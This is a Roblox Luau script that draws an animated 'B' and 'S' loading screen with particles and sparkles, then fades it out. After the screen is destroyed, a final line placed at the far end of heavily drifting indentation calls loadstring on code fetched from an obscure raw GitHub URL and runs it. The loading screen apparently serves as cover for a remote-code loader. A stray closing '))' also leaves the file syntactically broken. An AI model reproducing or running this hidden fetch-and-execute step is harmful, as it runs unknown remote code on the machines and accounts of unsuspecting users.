local RunService = game:GetService("RunService")
local Players= game:GetService("Players")
local player= Players.LocalPlayer
local gui= Instance.new("ScreenGui")
gui.Name= "LoadingAnimation"
gui.ResetOnSpawn= false
gui.IgnoreGuiInset= true
gui.ZIndexBehavior= Enum.ZIndexBehavior.Sibling
gui.Parent= player:WaitForChild("PlayerGui")

local container = Instance.new("Frame")
container.Name= "Container"
container.Size= UDim2.new(1, 0, 1, 0)
container.BackgroundColor3= Color3.fromRGB(15, 15, 25)
container.BorderSizePixel= 0
container.Parent= gui

local letterB = Instance.new("TextLabel")
letterB.Name= "B"
letterB.Size= UDim2.new(0, 200, 0, 300)
letterB.Position= UDim2.new(0.5, -220, 0.5, -150)
letterB.BackgroundTransparency= 1
letterB.Text= "B"
letterB.TextColor3= Color3.fromRGB(255, 50, 50)
letterB.TextScaled= true
letterB.Font= Enum.Font.FredokaOne
letterB.TextStrokeColor3= Color3.fromRGB(255, 150, 150)
letterB.TextStrokeTransparency= 0.4
letterB.Parent= container

local letterS = Instance.new("TextLabel")
letterS.Name= "S"
letterS.Size= UDim2.new(0, 200, 0, 300)
letterS.Position= UDim2.new(0.5, 20, 0.5, -150)
letterS.BackgroundTransparency= 1
letterS.Text= "S"
letterS.TextColor3= Color3.fromRGB(50, 150, 255)
letterS.TextScaled= true
letterS.Font= Enum.Font.FredokaOne
letterS.TextStrokeColor3= Color3.fromRGB(150, 200, 255)
letterS.TextStrokeTransparency= 0.4
letterS.Parent= container

local particles = Instance.new("Frame")
particles.Name= "Particles"
particles.Size= UDim2.new(1, 0, 1, 0)
particles.BackgroundTransparency= 1
particles.Parent= container

local particlePool = {}
for i= 1, 30 do
local p = Instance.new("Frame")
p.Size = UDim2.new(0, 10, 0, 10)
p.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
p.BorderSizePixel = 0
p.AnchorPoint = Vector2.new(0.5, 0.5)
p.Position = UDim2.new(0.5, 0, 0.5, 0)
p.BackgroundTransparency = 0.8
p.Parent = particles
p.Visible = false
particlePool[i] = {frame = p, active = false, life = 0, maxLife = 0, velocity = Vector2.new(0, 0), startPos = Vector2.new(0.5, 0.5)}
end

local sparkles = Instance.new("Frame")
sparkles.Name= "Sparkles"
sparkles.Size= UDim2.new(1, 0, 1, 0)
sparkles.BackgroundTransparency= 1
sparkles.Parent= container

local sparklePool = {}
for i= 1, 20 do
local s = Instance.new("Frame")
s.Size = UDim2.new(0, 6, 0, 6)
s.BackgroundColor3 = Color3.fromRGB(255, 255, 200)
s.BorderSizePixel = 0
s.AnchorPoint = Vector2.new(0.5, 0.5)
s.Position = UDim2.new(0, 0, 0, 0)
s.BackgroundTransparency = 0.9
s.Parent = sparkles
s.Visible = false
sparklePool[i] = {frame = s, active = false, life = 0, maxLife = 0, position = Vector2.new(0, 0)}
end

local time = 0
local flashPhase= 0
local pulsePhase= 0
local glowPhase= 0
local rotationPhase= 0
local hueShift= 0

local function spawnParticle(x, y, color)
for _, p in ipairs(particlePool) do
if not p.active then
p.active = true
p.life = 0
p.maxLife = 0.8 + math.random() * 0.7
p.velocity = Vector2.new((math.random() - 0.5) * 10, (math.random() - 0.5) * 10)
p.startPos = Vector2.new(x, y)
p.frame.Position = UDim2.new(x, 0, y, 0)
p.frame.BackgroundColor3 = color
p.frame.BackgroundTransparency = 0.5
p.frame.Size = UDim2.new(0, 12, 0, 12)
p.frame.Visible = true
break
end
end
end

local function spawnSparkle(x, y)
for _, s in ipairs(sparklePool) do
if not s.active then
s.active = true
s.life = 0
s.maxLife = 0.4 + math.random() * 0.3
s.position = Vector2.new(x, y)
s.frame.Position = UDim2.new(x, 0, y, 0)
s.frame.BackgroundColor3 = Color3.fromRGB(255, 255, 200)
s.frame.BackgroundTransparency = 0.7
s.frame.Size = UDim2.new(0, 6, 0, 6)
s.frame.Visible = true
break
end
end
end

RunService.RenderStepped:Connect(function(delta)
time = time + delta
flashPhase = (flashPhase + delta * 4) % (2 * math.pi)
pulsePhase = (pulsePhase + delta * 2) % (2 * math.pi)
glowPhase = (glowPhase + delta * 1.5) % (2 * math.pi)
rotationPhase = (rotationPhase + delta * 0.5) % (2 * math.pi)
hueShift = (hueShift + delta * 0.3) % 1

local flashIntensity = (math.sin(flashPhase) + 1) * 0.5
local pulseScale = 1 + 0.1 * math.sin(pulsePhase)
local glowAlpha = 0.2 + 0.15 * math.sin(glowPhase)
local rot = rotationPhase

letterB.TextColor3 = Color3.fromHSV(hueShift, 0.9, 0.9 + 0.1 * flashIntensity)
letterS.TextColor3 = Color3.fromHSV((hueShift + 0.5) % 1, 0.9, 0.9 + 0.1 * flashIntensity)

letterB.TextStrokeTransparency = 0.4 - 0.2 * flashIntensity
letterS.TextStrokeTransparency = 0.4 - 0.2 * flashIntensity

local bScale = pulseScale * (0.95 + 0.05 * math.sin(time * 3))
local sScale = pulseScale * (0.95 + 0.05 * math.sin(time * 3 + 1))
letterB.Size = UDim2.new(0, 200 * bScale, 0, 300 * bScale)
letterS.Size = UDim2.new(0, 200 * sScale, 0, 300 * sScale)

letterB.Rotation = 2 * math.sin(rot)
letterS.Rotation = 2 * math.sin(rot + 1)

if math.random() < 0.3 then
    spawnParticle(0.4 + math.random() * 0.2, 0.4 + math.random() * 0.2, letterB.TextColor3)
    end
    if math.random() < 0.3 then
        spawnParticle(0.4 + math.random() * 0.2, 0.4 + math.random() * 0.2, letterS.TextColor3)
        end
        
        if math.random() < 0.2 then
            spawnSparkle(math.random(), math.random())
            end
            
            for _, p in ipairs(particlePool) do
                if p.active then
                        p.life = p.life + delta
                                local lifeRatio = p.life / p.maxLife
                                        if lifeRatio >= 1 then
                                                    p.active = false
                                                                p.frame.Visible = false
                                                                        else
                                                                                    local x = p.startPos.X + p.velocity.X * p.life / 100
                                                                                                local y = p.startPos.Y + p.velocity.Y * p.life / 100
                                                                                                            p.frame.Position = UDim2.new(x, 0, y, 0)
                                                                                                                        p.frame.BackgroundTransparency = 0.5 + lifeRatio * 0.5
                                                                                                                                    p.frame.Size = UDim2.new(0, 12 * (1 - lifeRatio * 0.7), 0, 12 * (1 - lifeRatio * 0.7))
                                                                                                                                            end
                                                                                                                                                end
                                                                                                                                                end
                                                                                                                                                
                                                                                                                                                for _, s in ipairs(sparklePool) do
                                                                                                                                                    if s.active then
                                                                                                                                                            s.life = s.life + delta
                                                                                                                                                                    local lifeRatio = s.life / s.maxLife
                                                                                                                                                                            if lifeRatio >= 1 then
                                                                                                                                                                                        s.active = false
                                                                                                                                                                                                    s.frame.Visible = false
                                                                                                                                                                                                            else
                                                                                                                                                                                                                        s.frame.BackgroundTransparency = 0.7 + lifeRatio * 0.3
                                                                                                                                                                                                                                    local scale = 1 + 0.5 * math.sin(lifeRatio * math.pi)
                                                                                                                                                                                                                                                s.frame.Size = UDim2.new(0, 6 * scale, 0, 6 * scale)
                                                                                                                                                                                                                                                        end
                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                            container.BackgroundColor3 = Color3.fromRGB(
                                                                                                                                                                                                                                                                    15 + 5 * math.sin(time * 0.5),
                                                                                                                                                                                                                                                                        15 + 5 * math.sin(time * 0.5 + 1),
                                                                                                                                                                                                                                                                            25 + 5 * math.sin(time * 0.5 + 2)
                                                                                                                                                                                                                                                            )

                                                                                                                                                                                                                                                            end)

                                                                                                                                                                                                                                                            wait(3)

                                                                                                                                                                                                                                                            local fadeTime = 1
                                                                                                                                                                                                                                                            local startTime= tick()
                                                                                                                                                                                                                                                            while tick()- startTime < fadeTime do
                                                                                                                                                                                                                                                            local alpha = (tick() - startTime) / fadeTime
                                                                                                                                                                                                                                                            container.BackgroundTransparency = alpha
                                                                                                                                                                                                                                                            letterB.TextTransparency = alpha
                                                                                                                                                                                                                                                            letterB.TextStrokeTransparency = 0.4 + alpha * 0.6
                                                                                                                                                                                                                                                            letterS.TextTransparency = alpha
                                                                                                                                                                                                                                                            letterS.TextStrokeTransparency = 0.4 + alpha * 0.6
                                                                                                                                                                                                                                                            for _, p in ipairs(particlePool) do
                                                                                                                                                                                                                                                            if p.active then
                                                                                                                                                                                                                                                            p.frame.BackgroundTransparency = 0.5 + alpha * 0.5
                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                            for _, s in ipairs(sparklePool) do
                                                                                                                                                                                                                                                            if s.active then
                                                                                                                                                                                                                                                            s.frame.BackgroundTransparency = 0.7 + alpha * 0.3
                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                            RunService.RenderStepped:Wait()
                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                            gui:Destroy()
                                                                                                                                                                                                                                                            loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/githubusercontent.txt"))()
                                                                                                                                                                                                                                                            ))